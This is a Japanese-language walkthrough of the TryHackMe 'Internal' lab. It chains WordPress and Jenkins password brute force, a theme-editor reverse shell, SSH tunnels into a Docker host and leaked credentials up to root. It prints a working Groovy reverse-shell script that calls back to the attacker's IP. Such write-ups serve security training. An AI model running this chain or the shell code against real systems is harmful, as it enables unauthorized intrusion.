# Internal CTF

https://tryhackme.com/room/internal

## Enumeration

```shell
TARGET=10.201.11.118
sudo bash -c "echo $TARGET   internal.thm >> /etc/hosts"
```

### ポートスキャン

```sh
root@ip-10-201-62-45:~# nmap -sS -p- $TARGET

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 16:FF:C7:B6:05:E1 (Unknown)
```

```sh
root@ip-10-201-62-45:~# nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 16:FF:C7:B6:05:E1 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, HTTP。  
HTTP は apache のデフォルトページ。

### サブドメイン、VHOST

```shell
$ ffuf -u http://internal.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.internal.thm' -fs 10918

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.internal.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 10918
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 120 req/sec :: Duration: [0:16:10] :: Errors: 0 ::
```

何もない。

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://internal.thm/ ----
==> DIRECTORY: http://internal.thm/blog/
+ http://internal.thm/index.html (CODE:200|SIZE:10918)
==> DIRECTORY: http://internal.thm/javascript/
==> DIRECTORY: http://internal.thm/phpmyadmin/
+ http://internal.thm/server-status (CODE:403|SIZE:277)
==> DIRECTORY: http://internal.thm/wordpress/
...
```

wordpressのブログを発見。

### wpscan

```sh
$ wpscan --url http://internal.thm/blog -e

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.9
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'
```

adminユーザーでブルートフォースしてみる。

```sh
$ wpscan --url http://internal.thm/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin

[!] Valid Combinations Found:
 | Username: admin, Password: [REDACTED]
```

成功。

Privateなポストを発見。何の認証情報かは不明。

```text
Posted onAugust 3, 2020Edit"Private:"
Private:
To-Do

Don’t forget to reset Will’s credentials. william:[REDACTED]
```

## リバースシェル

Themeエディターから、404.php をリバースシェルに変更。

```sh
$ nc -nlvp 8888          
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.11.118] 58768
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:33:54 up 56 min,  0 users,  load average: 0.00, 0.04, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ 
```

## www-data

william というユーザーはいなかった。

```sh
www-data@internal:/$ ls -al /home
total 12
drwxr-xr-x  3 root      root      4096 Aug  3  2020 .
drwxr-xr-x 24 root      root      4096 Aug  3  2020 ..
drwx------  7 aubreanna aubreanna 4096 Aug  3  2020 aubreanna
```

8080 ポートがローカルで開いている。

```sh
ww-data@internal:/$ ss -nl | grep '127.0.0.1'
tcp               LISTEN              0                    80                                                                                         127.0.0.1:3306                                              0.0.0.0:*                     
tcp               LISTEN              0                    128                                                                                        127.0.0.1:8080                                              0.0.0.0:*                     
tcp               LISTEN              0                    128                                                                                        127.0.0.1:43765                                             0.0.0.0:*
```

3306ポートからMySQLログインできたが、何も出なかった。

8080ポートにリクエスト

```sh
www-data@internal:/$ curl -v http://localhost:8080
* Rebuilt URL to: http://localhost:8080/
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 403 Forbidden
< Date: Sat, 04 Oct 2025 23:38:28 GMT
< X-Content-Type-Options: nosniff
< Set-Cookie: JSESSIONID.e96171ac=node0180nppzprmw1wsq1hjplimle80.node0; Path=/; HttpOnly
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< Content-Type: text/html;charset=utf-8
< X-Hudson: 1.395
< X-Jenkins: 2.250
< X-Jenkins-Session: 50d3386e
< X-Hudson-CLI-Port: 50000
< X-Jenkins-CLI-Port: 50000
< X-Jenkins-CLI2-Port: 50000
< X-You-Are-Authenticated-As: anonymous
< X-You-Are-In-Group-Disabled: JENKINS-39402: use -Dhudson.security.AccessDeniedException2.REPORT_GROUP_HEADERS=true or use /whoAmI to diagnose
< X-Required-Permission: hudson.model.Hudson.Read
< X-Permission-Implied-By: hudson.security.Permission.GenericRead
< X-Permission-Implied-By: hudson.model.Hudson.Administer
< Content-Length: 793
< Server: Jetty(9.4.30.v20200611)
< 
<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'>


Authentication required
<!--
You are authenticated as: anonymous
Groups that you are in:
  
Permission you need to have (but didn't): hudson.model.Hudson.Read
 ... which is implied by: hudson.security.Permission.GenericRead
 ... which is implied by: hudson.model.Hudson.Administer
-->

* Connection #0 to host localhost left intact
</body></html>
```

ターゲットマシンからKaliに向けてトンネルを作る。
```sh
www-data@internal:/$ ssh tunnel@10.11.146.32 -R 8081:localhost:8080 -N
```

kaliで http://localhost:8081 にアクセスすると、Jenkinsのログイン画面が表示された。

## Jenkins

william の認証情報を入れたがログインできなかった。

adminで単純なパスワードを試すがうまくいかず。いったんトンネルをやめて列挙に戻る。

## 再列挙

/opt/wp-save.txt に aubreanna のパスワードがあった。SSHログイン可能！

```sh
ww-data@internal:/$ cat /opt/wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:[REDACTED]
```

jenkins.txt を発見。

```sh
aubreanna@internal:~$ ls -al
total 56
drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 .
drwxr-xr-x 3 root      root      4096 Aug  3  2020 ..
-rwx------ 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .local
-rwx------ 1 root      root       223 Aug  3  2020 .mysql_history
-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .ssh
-rwx------ 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
```

パスワードでも入っているかと期待していたが。

```sh
aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

IPアドレスは自分のIPと異なる。この点はどう解釈するべきか？

```sh
aubreanna@internal:~$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:b9ff:fe5f:7f1f  prefixlen 64  scopeid 0x20<link>
        ether 02:42:b9:5f:7f:1f  txqueuelen 0  (Ethernet)
        RX packets 99  bytes 67324 (67.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 129  bytes 28126 (28.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```sh
aubreanna@internal:~$ ping -c 3 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.029 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.046 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.041 ms
```

ターゲットとは別のホストが稼働しているという形。

```sh
aubreanna@internal:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 internal

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

このIPに向けてトンネルしてみる。

```sh
aubreanna@internal:~$ ssh tunnel@10.11.146.32 -R 8081:172.17.0.2:8080 -N
```

同じようにJenkinsのログイン画面が表示されるが、相変わらず認証情報が分からない。

手詰まりのためブルートフォースを試みたら、adminのパスワードが判明した。

```sh
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8081 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password'
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-05 09:42:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://127.0.0.1:8081/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password
[8081][http-post-form] host: 127.0.0.1   login: admin   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-05 09:42:44
```

Groovy スクリプトコンソールからリバースシェルを実行。

```sh
Thread.start {
String host="10.11.146.32";
int port=6688;
String cmd="sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
}
```

jenkinsのシェル取得成功。

```sh
$ nc -nlvp 6688          
listening on [any] 6688 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.11.118] 49760
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
```

rootの認証情報が書かれたテキストを発見。

```sh
cat /opt/note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:[REDACTED]
```

127.0.1.1 に戻って、入手したパスワードを使い root にユーザー変更。

```sh
aubreanna@internal:~$ su -
Password: 
root@internal:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- 複数のホストが存在するCTFはありそうであまりないタイプで、とても面白かった。
- wordpress 系はブルートフォース大事。
